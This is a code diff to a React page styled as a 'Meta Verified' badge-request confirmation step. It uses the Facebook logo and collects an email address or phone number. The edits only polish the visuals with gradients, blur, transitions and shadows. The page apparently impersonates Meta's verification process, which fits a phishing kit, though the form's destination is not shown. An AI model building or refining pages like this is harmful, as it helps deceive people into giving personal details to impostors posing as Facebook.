@@ -106,8 +106,8 @@ export default function Confirmation() {
         title="Meta Verified | Confirmation"
         description="Request a verified badge on Facebook - Final Step"
       />
-      <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
-        <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
+      <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
+        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20">
           <img 
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
             alt="Logo"
@@ -127,10 +127,10 @@ export default function Confirmation() {
                     <button
                       type="button"
                       onClick={() => setContactMethod('email')}
-                      className={`flex-1 py-1.5 text-sm rounded ${
+                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                         contactMethod === 'email'
-                          ? 'bg-[#0180FA] text-white'
-                          : 'bg-[#e4e6eb] text-[#606770]'
+                          ? 'bg-[#0180FA] text-white shadow-md'
+                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                       }`}
                     >
                       Email
@@ -138,10 +138,10 @@ export default function Confirmation() {
                     <button
                       type="button"
                       onClick={() => setContactMethod('phone')}
-                      className={`flex-1 py-1.5 text-sm rounded ${
+                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                         contactMethod === 'phone'
-                          ? 'bg-[#0180FA] text-white'
-                          : 'bg-[#e4e6eb] text-[#606770]'
+                          ? 'bg-[#0180FA] text-white shadow-md'
+                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                       }`}
                     >
                       Phone
@@ -221,7 +221,7 @@ export default function Confirmation() {
 
               <Button 
                 type="submit" 
-                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
+                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200 shadow-md"
                 disabled={form.formState.isSubmitting}
               >
                 {form.formState.isSubmitting ? "Submitting..." : "Submit"}
